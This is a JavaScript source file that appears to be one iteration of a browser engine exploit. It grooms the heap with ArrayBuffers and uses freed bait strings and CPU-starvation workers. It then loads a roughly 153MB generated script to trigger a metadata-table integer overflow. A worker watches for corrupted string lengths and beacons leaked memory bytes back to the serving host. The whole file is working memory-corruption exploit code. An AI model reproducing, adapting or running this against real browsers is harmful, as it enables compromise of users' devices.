// p172 — MetadataTable overflow with pre-mapped heap + CPU starvation
//
// Strategy: map lots of marge pages before the overflow so the 4.29GB
// sweep has more mapped memory to traverse before hitting unmapped pages.
// CPU starvation workers slow the LLInt, giving the watcher more time.
//
// Phase 1: Allocate 50MB of 100KB ArrayBuffers (same size class as metadata)
// Phase 2: Free them (MADV_FREE keeps pages mapped on FreeBSD)
// Phase 3: GC pressure
// Phase 4: Allocate baits + worker targets (bait-and-switch)
// Phase 5: Free baits, GC, spawn CPU starvation workers
// Phase 6: Build and load the 153MB overflow script
// Phase 7: Start watcher, call function
//
// Beacon prefix: V172-

(function() {
  var BASE = location.protocol + '//' + location.host;
  var queue = [];
  var sending = false;

  function B(tag) {
    queue.push(tag);
    if (!sending) drain();
  }

  function drain() {
    if (queue.length === 0) { sending = false; return; }
    sending = true;
    var tag = queue.shift();
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V172-' + tag + '?t=' + Date.now(), true);
      x.onloadend = function() { setTimeout(drain, 15); };
      x.onerror = function() { setTimeout(drain, 15); };
      x.send();
    } catch(e) { setTimeout(drain, 15); }
  }

  function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  var attempt = 0;
  try {
    attempt = parseInt(localStorage.getItem('p172_att') || '0');
    localStorage.setItem('p172_att', '' + (attempt + 1));
  } catch(e) {}

  B('BOOT-A' + attempt);

  // ── Phase 1: Pre-map marge pages ──
  var CHUNK_SIZE = 102400;
  var N_MAP = 500; // 50MB
  var mapBuffers = [];
  var mapCount = 0;

  function allocMap() {
    try {
      for (var i = 0; i < 50 && mapCount < N_MAP; i++) {
        mapBuffers.push(new ArrayBuffer(CHUNK_SIZE));
        mapCount++;
      }
    } catch(e) {
      B('OOM-MAP-' + mapCount);
      mapCount = N_MAP;
    }

    if (mapCount < N_MAP) {
      if (mapCount % 100 === 0) B('MAP-' + mapCount);
      setTimeout(allocMap, 5);
    } else {
      B('MAPPED-' + mapBuffers.length);
      phase2Free();
    }
  }

  allocMap();

  // ── Phase 2: Free mapped pages ──
  function phase2Free() {
    var n = mapBuffers.length;
    for (var i = 0; i < mapBuffers.length; i++) mapBuffers[i] = null;
    mapBuffers = null;
    B('FREED-' + n);

    var gc = 0;
    function gcRound() {
      for (var j = 0; j < 2000; j++) new ArrayBuffer(4096);
      gc++;
      if (gc < 40) setTimeout(gcRound, 15);
      else { B('GC1-OK'); phase3Targets(); }
    }
    gcRound();
  }

  // ── Phase 3: Baits + worker targets ──
  function phase3Targets() {
    B('PHASE3');

    // Watcher worker
    var watcherCode = function() {
      var targets = [];
      var baseUrl = '';
      var STR_LEN = 100000;

      function beacon(tag) {
        try {
          var x = new XMLHttpRequest();
          x.open('GET', baseUrl + '/beacon/V172-W-' + tag + '?t=' + Date.now(), true);
          x.send();
        } catch(e) {}
      }
      function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

      self.onmessage = function(e) {
        if (e.data.cmd === 'init') {
          baseUrl = e.data.baseUrl;
          beacon('ALIVE');
          return;
        }
        if (e.data.cmd === 'alloc') {
          var chunk = '';
          for (var k = 0; k < 100; k++) chunk += 'AAAAAAAAAA';
          for (var i = 0; i < 14; i++) {
            var s = '';
            for (var j = 0; j < STR_LEN; j += 1000) s += chunk;
            s = s.substring(0, STR_LEN);
            s.charCodeAt(0);
            targets.push(s);
          }
          beacon('T-' + targets.length);
          self.postMessage({ ready: true });
          return;
        }
        if (e.data.cmd === 'watch') {
          beacon('WATCH');
          var found = -1;
          var iters = 0;

          while (found < 0) {
            for (var i = 0; i < targets.length; i++) {
              if (targets[i].length !== STR_LEN) {
                found = i;
                break;
              }
            }
            iters++;
            if (iters % 5000000 === 0) beacon('P-' + iters);
            if (iters > 500000000) { beacon('GIVEUP'); return; }
          }

          beacon('HIT-' + found + '-len=' + targets[found].length);

          var lens = '';
          for (var i = 0; i < targets.length; i++) lens += targets[i].length + ',';
          beacon('LENS-' + lens);

          for (var i = 0; i < targets.length; i++) {
            var len = targets[i].length;
            if (len === STR_LEN) continue;

            beacon('C' + i + '-0x' + len.toString(16));

            var cc = '';
            var scanMax = Math.min(len, 300);
            for (var b = 0; b < scanMax; b++) {
              try {
                var ch = targets[i].charCodeAt(b);
                if (ch !== 0x41) cc += b + ':' + hx(ch) + ',';
              } catch(e) { cc += b + ':E,'; break; }
            }
            beacon('CC' + i + '-' + (cc || 'ALL41').substring(0, 200));

            try {
              var cp = '';
              for (var b = 0; b < 16; b++) cp += targets[i].codePointAt(b) + ',';
              beacon('CP' + i + '-' + cp);
            } catch(e) { beacon('CP' + i + '-E'); }

            try {
              var enc = new TextEncoder();
              var bytes = enc.encode(targets[i].substring(0, 64));
              var te = '';
              for (var b = 0; b < bytes.length; b++) te += hx(bytes[b]);
              beacon('TE' + i + '-' + te.substring(0, 200));
            } catch(e) { beacon('TE' + i + '-E'); }

            try {
              var b64 = btoa(targets[i].substring(0, 48));
              beacon('B6' + i + '-' + b64.substring(0, 100));
            } catch(e) { beacon('B6' + i + '-E-' + (e.message||'').substring(0,20)); }

            if (len > 112) {
              var st = '';
              var off = [0,4,8,12,16,20,24,28,32,48,56,64,68,72,80,96,104,108,112];
              for (var oi = 0; oi < off.length; oi++) {
                try { st += off[oi] + ':' + hx(targets[i].charCodeAt(off[oi])) + ','; }
                catch(e) { st += off[oi] + ':E,'; }
              }
              beacon('ST' + i + '-' + st.substring(0, 200));
            }

            var b0 = len & 0xFF, b1 = (len>>8) & 0xFF;
            var b2 = (len>>16) & 0xFF, b3 = (len>>24) & 0xFF;
            beacon('RL' + i + '-' + hx(b3) + hx(b2) + hx(b1) + hx(b0));

            if (i >= 3) break;
          }
          beacon('DONE');
        }
      };
    };

    var watchBlob = new Blob(
      ['(' + watcherCode.toString() + ')()'],
      { type: 'application/javascript' }
    );
    var watcher = new Worker(URL.createObjectURL(watchBlob));
    watcher.postMessage({ cmd: 'init', baseUrl: BASE });

    // Baits
    var N_BAIT = 20 + (attempt % 5) * 2;
    var STR_LEN = 100000;
    B('BAIT-N' + N_BAIT);
    var baits = [];
    var baitChunk = '';
    for (var k = 0; k < 100; k++) baitChunk += 'BBBBBBBBBB';
    for (var i = 0; i < N_BAIT; i++) {
      var bait = '';
      for (var j = 0; j < STR_LEN; j += 1000) bait += baitChunk;
      bait = bait.substring(0, STR_LEN);
      bait.charCodeAt(0);
      baits.push(bait);
    }
    baitChunk = null;
    B('BAIT-OK');

    watcher.onmessage = function(e) {
      if (e.data.ready) phase4Build();
    };
    watcher.postMessage({ cmd: 'alloc' });

    function phase4Build() {
      // Free baits
      for (var i = 0; i < baits.length; i++) baits[i] = null;
      baits = null;
      B('BAIT-FREE');

      var gc = 0;
      function gcRound() {
        for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
        gc++;
        if (gc < 30) setTimeout(gcRound, 30);
        else { B('GC2-OK'); spawnStarvers(); }
      }
      gcRound();
    }

    function spawnStarvers() {
      // CPU starvation: 4 workers spinning to slow main thread LLInt
      var starvCode = function() {
        self.onmessage = function(e) {
          var x = 0;
          while (true) { x = (x + 1) | 0; }
        };
      };
      var starvBlob = new Blob(
        ['(' + starvCode.toString() + ')()'],
        { type: 'application/javascript' }
      );
      for (var sw = 0; sw < 4; sw++) {
        var w = new Worker(URL.createObjectURL(starvBlob));
        w.postMessage('spin');
      }
      B('STARV-4');
      doBuild();
    }

    function doBuild() {
      B('BUILD');
      var N = 38348816;
      var CHUNK = 4000000;
      var CHUNKS = Math.floor(N / CHUNK);
      var REM = N - CHUNKS * CHUNK;

      var callChunk = '';
      for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
      var remChunk = '';
      for (var r = 0; r < REM; r++) remChunk += 'a();';

      var parts = ['window.__v172=function(a){'];
      for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
      parts.push(remChunk);
      parts.push('};window.__v172ok=1;');

      var blob = new Blob(parts, { type: 'application/javascript' });
      B('BLOB-' + (blob.size / 1048576 | 0) + 'M');
      callChunk = null; remChunk = null; parts = null;

      var url = URL.createObjectURL(blob);
      var sc = document.createElement('script');

      sc.onload = function() {
        B('COMP-' + (window.__v172ok ? 'OK' : 'NO'));
        if (!window.__v172) { B('NOFN'); return; }

        watcher.postMessage({ cmd: 'watch' });

        setTimeout(function() {
          B('CALL');
          try {
            window.__v172(function(){});
          } catch(ex) {
            B('EX-' + (ex.message || '').substring(0, 20));
          }
          B('ALIVE');
        }, 200);
      };

      sc.onerror = function() { B('SERR'); };
      document.head.appendChild(sc);
      sc.src = url;
    }
  }
})();
